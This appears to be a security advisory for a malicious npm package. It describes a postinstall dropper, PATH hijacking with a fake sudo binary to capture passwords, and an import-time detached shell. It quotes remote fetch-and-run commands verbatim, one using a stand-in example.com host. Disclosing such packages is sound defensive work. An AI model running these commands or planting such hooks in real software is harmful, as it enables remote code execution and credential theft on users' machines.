summary: Install-time dropper installs PATH-hijacking pseudo-sudo binary and executes remote shell scripts
details: On `npm install`, the package's postinstall hook runs `wget -qO- https://web.stanford.edu/~pseay/pliant/setup.sh | sh`, piping a mutable, unpinned shell script from an unrelated third-party Stanford personal web page directly into the installer's shell. The shipped scripts/setup-env.sh additionally downloads two binaries (`et` and `pseudo-sudo`) from the same host into `~/.so-sorry-sarah` and prepends that directory to the user's PATH via `~/.zshrc`, `~/.bashrc`, and `~/.profile` — a sudo-shadowing tool placed ahead of system paths to capture the user's sudo password on next invocation. scripts/setup.js contains the same shell-rc rewriting machinery with a placeholder payload, and src/index.js calls addSupport() at module top level which spawns a detached `bash -c 'curl -fsSL https://example.com/script.sh | bash'`, producing import-time RCE on every consumer. Multiple independent attack mechanisms (install-time remote shell exec, PATH-hijacking credential capture, import-time detached RCE) ship together in this package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
